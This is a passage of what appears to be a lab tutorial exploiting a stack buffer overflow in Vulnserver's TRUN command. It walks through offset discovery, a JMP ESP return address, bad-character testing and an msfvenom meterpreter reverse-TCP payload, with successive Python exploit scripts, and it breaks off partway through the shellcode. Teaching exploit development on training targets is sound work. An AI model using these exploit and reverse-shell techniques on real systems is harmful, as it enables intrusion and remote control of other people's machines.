+<img src="https://dunderhay.github.io/images/vulnserver/trun/trun-crash1.png" alt="trun-crash1" width="900"/>
+<p>The stack has been corrupted and as a result several <code>registers</code> now contains the user supplied buffer of A&rsquo;s. Lets take a closer look at these register values:</p>
+<img src="https://dunderhay.github.io/images/vulnserver/trun/trun-crash1-stack.png" alt="trun-crash1-stack" width="900"/>
+<ul>
+<li><code>EAX</code>: The EAX register contains the entire buffer including the initial <code>TRUN .</code> command.</li>
+<li><code>ESP</code>: The Stack Pointer contains part of the user supplied provided buffer.</li>
+<li><code>EBP</code>: The Saved Frame Pointer contains 4 x &lsquo;A&rsquo; (<code>41414141</code>) characters.</li>
+<li><code>EIP</code>: The Instruction Pointer also contains 4 x &lsquo;A&rsquo; (<code>41414141</code>) characters.</li>
+</ul>
+<p>Passing the exception to the program, the application crashes due to <code>EIP</code> containing a non readable memory address (<code>41414141</code>) as shown below:</p>
+<img src="https://dunderhay.github.io/images/vulnserver/trun/trun-crash1-eip.png" alt="trun-crash1-eip" width="900"/>
+<p>This is a vanilla stack-based buffer overflow. We can directly control the flow of execution via the <code>EIP</code> register. The next step is to identify the four bytes that overwrite <code>EIP</code> by sending a <strong>unique string</strong> in our buffer that we will search for once the application crashes. There are various ways to do this, I used the Metasploit Framework to generate a unique string of length (<code>-l</code>) 2800 characters with the following command:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf-pattern_create -l <span class="m">2800</span>
+</span></span></code></pre></div><img src="https://dunderhay.github.io/images/vulnserver/trun/trun-generate-unique-string.png" alt="trun-generate-unique-string" width="700"/>
+<p>Update the exploit script with the unique string:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="s1">&#39;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2D&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="s1">&#39;TRUN .&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">command</span> <span class="o">+</span> <span class="n">buffer</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s1">&#39;[*] Sending data: &#39;</span> <span class="o">+</span> <span class="n">data</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="s1">&#39;192.168.185.146&#39;</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></div><p>Send the updated exploit script:</p>
+<img src="https://dunderhay.github.io/images/vulnserver/trun/trun-send-unique-string.png" alt="trun-send-unique-string" width="700"/>
+<p>Looking at the updated value of the <code>EIP</code> register in the debugger:</p>
+<img src="https://dunderhay.github.io/images/vulnserver/trun/trun-crash-unique-string.png" alt="trun-crash-unique-string" width="900"/>
+<p>Workout the offset:</p>
+<pre tabindex="0"><code>msf-pattern_offset -l 2800 -q 396F4338
+</code></pre><img src="https://dunderhay.github.io/images/vulnserver/trun/trun-crash-find-offset.png" alt="trun-crash-find-offset" width="700"/>
+<p>Now to confirm that we can control the value in <code>EIP</code> by overwriting the four bytes with <strong>B&rsquo;s</strong> (<code>42</code> in HEX).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pre_padding</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">2006</span>
+</span></span><span class="line"><span class="cl"><span class="n">eip</span> <span class="o">=</span> <span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="n">post_padding</span> <span class="o">=</span> <span class="s1">&#39;C&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">3000</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">pre_padding</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">eip</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="n">pre_padding</span> <span class="o">+</span> <span class="n">eip</span> <span class="o">+</span> <span class="n">post_padding</span>
+</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="s1">&#39;TRUN .&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">command</span> <span class="o">+</span> <span class="n">buffer</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s1">&#39;[*] Sending data: &#39;</span> <span class="o">+</span> <span class="n">data</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="s1">&#39;192.168.185.146&#39;</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></div><img src="https://dunderhay.github.io/images/vulnserver/trun/trun-send-crash2.png" alt="trun-send-crash2" width="700"/>
+<img src="https://dunderhay.github.io/images/vulnserver/trun/trun-crash2-eip1.png" alt="trun-crash2-eip1" width="900"/>
+<h2 id="control-execution-flow" class="relative group">Control execution flow <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#control-execution-flow" aria-label="Anchor">#</a></span></h2>
+<p>Because we are overflowing a buffer on the stack, our exploit payload ends up on the stack. This is how we gain control of the return address.</p>
+<p>During the crash we see that the saved <strong>stack frame pointer</strong> (<code>ESP</code>), points directly to the start of buffer of <strong>C&rsquo;s</strong>, which we placed in the payload right after the 4 bytes of <strong>B&rsquo;s</strong> that overwrite the <strong>return address</strong> on the stack. This buffer of C&rsquo;s is where we will insert our shellcode later on.</p>
+<p>The <code>ret</code> assembly call pops the 4 bytes <strong>(BBBB)</strong> into <code>EIP</code>, and <code>ESP</code> points to the remainder of the buffer that follows (CCC&hellip;).</p>
+<img src="https://dunderhay.github.io/images/vulnserver/trun/trun-crash2-eip2.png" alt="trun-crash2-eip2" width="900"/>
+<p>Due to memory protection mechanisms such as Address Space Layout Randomisation (ASLR), it is no longer possible to rely on a hard-coded return address in memory.</p>
+<h3 id="jmp--call-esp" class="relative group">JMP || CALL ESP <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#jmp--call-esp" aria-label="Anchor">#</a></span></h3>
+<p>Instead of hard-coding a return address, we can use a register (such as <code>ESP</code> in this instance) that contains the address where the shellcode resides in memory. We then replace the values inserted into the <code>EIP</code> register with the memory address of a <code>JMP ESP</code> instruction, in order to redirect the flow of execution to our shellcode.</p>
+<p>This can be done by finding the <strong>opcode</strong> of a <code>jump</code> or <code>call</code> to that register in any non-ASLRd dll that is loaded when the application executes, and overwriting the value of <code>EIP</code> with the opcode for &ldquo;jump to <code>ESP</code> register&rdquo; instruction.</p>
+<p>To find an address which contains a <code>JMP ESP</code> instruction, we can use <strong>mona</strong>.</p>
+<p>For your exploit to be portable (work on other machines), it is recommended to use an address from the application you are exploiting itself, or a DLL that comes with the application.</p>
+<p>To search a specific DLL with mona, use the <code>-m</code> flag and pass the module name. For example:</p>
+<pre tabindex="0"><code>!mona jmp -r esp -m essfunc.dll
+</code></pre><img src="https://dunderhay.github.io/images/vulnserver/trun/trun-jmp-esp-mona.png" alt="trun-jmp-esp-mona" width="900"/>
+<p>Go to the memory address and confirm the <code>JMP ESP</code> instruction:</p>
+<img src="https://dunderhay.github.io/images/vulnserver/trun/trun-jmp-esp-instruction.png" alt="trun-jmp-esp-instruction" width="700"/>
+<p>The next step is to update the exploit so that the value of the <code>EIP</code> register is overwritten with the memory address of the <code>JMP ESP</code> instruction (<code>625011BB</code>), in order to redirect the flow of execution to our shellcode.</p>
+<p>Place a breakpoint at the <code>JMP ESP</code> instruction memory address (<code>625011BB</code>) before running the updated script.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pre_padding</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">2006</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 625011BB -&gt; jmp ESP in essfunc.dll</span>
+</span></span><span class="line"><span class="cl"><span class="n">eip</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\xBB\x11\x50\x62</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">post_padding</span> <span class="o">=</span> <span class="s1">&#39;C&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">3000</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">pre_padding</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">eip</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="n">pre_padding</span> <span class="o">+</span> <span class="n">eip</span> <span class="o">+</span> <span class="n">post_padding</span>
+</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="s1">&#39;TRUN .&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">command</span> <span class="o">+</span> <span class="n">buffer</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s1">&#39;[*] Sending data: &#39;</span> <span class="o">+</span> <span class="n">data</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="s1">&#39;192.168.185.146&#39;</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></div><p>After the application crashes, the breakpoint is hit. Stepping through this in the debugger (<code>F2</code>), the <code>JMP ESP</code> instruction is executed. <code>EIP</code> now points to <code>ESP</code>, which contains our buffer of <strong>C&rsquo;s</strong>.</p>
+<p>Before placing the shellcode here, it is best to test for <strong>bad characters</strong> which could mangle our shellcode, resulting in our exploit failing to work.</p>
+<img src="https://dunderhay.github.io/images/vulnserver/trun/trun-jmp-esp-stack.png" alt="trun-jmp-esp-stack" width="900"/>
+<h2 id="bad-characters" class="relative group">Bad Characters <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#bad-characters" aria-label="Anchor">#</a></span></h2>
+<p>To test for bad characters, I prefer to send the characters from <code>01</code> to <code>FF</code> (excluding <code>00</code> which is a known terminator for strings in this instance) to the application, and manually check the results in the debugger.</p>
+<p>Lets update the script:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pre_padding</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">2006</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 625011BB -&gt; jmp ESP in essfunc.dll</span>
+</span></span><span class="line"><span class="cl"><span class="n">eip</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\xBB\x11\x50\x62</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">badchars</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="se">\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="se">\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="se">\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="se">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="se">\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="se">\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="se">\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="se">\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="se">\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="se">\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="se">\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="se">\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="se">\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="se">\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;</span><span class="se">\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">buffer</span> <span class="o">=</span> <span class="n">pre_padding</span> <span class="o">+</span> <span class="n">eip</span> <span class="o">+</span> <span class="n">badchars</span>
+</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="s1">&#39;TRUN .&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">command</span> <span class="o">+</span> <span class="n">buffer</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="s1">&#39;[*] Sending data: &#39;</span> <span class="o">+</span> <span class="n">data</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">create_connection</span><span class="p">((</span><span class="s1">&#39;192.168.185.146&#39;</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></div><p>As we can see in the debugger, no other characters appear to be getting mangled:</p>
+<img src="https://dunderhay.github.io/images/vulnserver/trun/trun-badchars.png" alt="trun-badchars" width="900"/>
+<h2 id="shellcode" class="relative group">Shellcode <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#shellcode" aria-label="Anchor">#</a></span></h2>
+<p>Okay, so in theory this is the easy part&hellip; lets generate some shellcode using <strong>msfvenom</strong>, and replace the bad characters / buffer of C&rsquo;s with a meterpreter reverse tcp payload. Remember to specify the nullbyte as a bad character using the <code>-b '\x00'</code> flag.</p>
+<pre tabindex="0"><code>msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.185.145 LPORT=4444 EXITFUNC=thread -b &#39;\x00&#39; -e x86/xor_dynamic -f python
+</code></pre><img src="https://dunderhay.github.io/images/vulnserver/trun/trun-generate-shellcode.png" alt="trun-generate-shellcode" width="700"/>
+<p>It is advised to give the shellcode encoder some space before executing, so I have included a <strong>32 byte nopsled</strong> (<code>'\x90' * 32</code>) before the shellcode.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pre_padding</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">2006</span>
+</span></span><span class="line"><span class="cl"><span class="n">eip</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\xBB\x11\x50\x62</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\xeb\x23\x5b\x89\xdf\xb0\x36\xfc\xae\x75\xfd\x89\xf9</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x89\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\x40\xc0\x74</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x08\x46\x80\x3e\x36\x75\xee\xeb\xea\xff\xe1\xe8\xd8</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\xff\xff\xff\x09\x36\xf5\xe1\x8b\x09\x09\x09\x69\x80</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\xec\x38\xc9\x6d\x82\x59\x39\x82\x5b\x05\x82\x5b\x1d</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x82\x7b\x21\x06\xbe\x43\x2f\x38\xf6\xa5\x35\x68\x75</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x0b\x25\x29\xc8\xc6\x04\x08\xce\xeb\xfb\x5b\x5e\x82</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x5b\x19\x82\x43\x35\x82\x45\x18\x71\xea\x41\x08\xd8</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">+=</span> <span class="s1">&#39;</span><span class="se">\x58\x82\x50\x29\x08\xda\x82\x40\x11\xea\x33\x40\x82</span><span class="s1">&#39;</span>
